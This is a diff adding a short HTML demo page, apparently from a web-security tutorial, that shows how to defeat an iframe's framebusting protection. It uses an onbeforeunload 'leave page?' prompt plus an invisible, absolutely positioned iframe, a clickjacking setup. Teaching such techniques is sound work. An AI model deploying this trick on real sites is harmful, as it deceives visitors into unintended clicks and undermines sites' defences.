@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+
+  <style>
+    iframe {
+      width: 400px;
+      height: 100px;
+      position: absolute;
+      top: 0;
+      left: -20px;
+      opacity: 0;
+      z-index: 1;
+    }
+  </style>
+
+  <script>
+    function attack() {
+
+      window.onbeforeunload = function() {
+        window.onbeforeunload = null;
+        return "Want to leave without learning all the secrets (he-he)?";
+      };
+
+      document.body.insertAdjacentHTML('beforeend', '<iframe src="iframe.html">');
+    }
+  </script>
+</head>
+
+<body>
+
+  <p>After a click on the button the visitor gets a "strange" question about whether they want to leave.</p>
+
+  <p>Probably they would respond "No", and the iframe protection is hacked.</p>
+
+  <button onclick="attack()">Add a "protected" iframe</button>
+
+</body>
+</html>
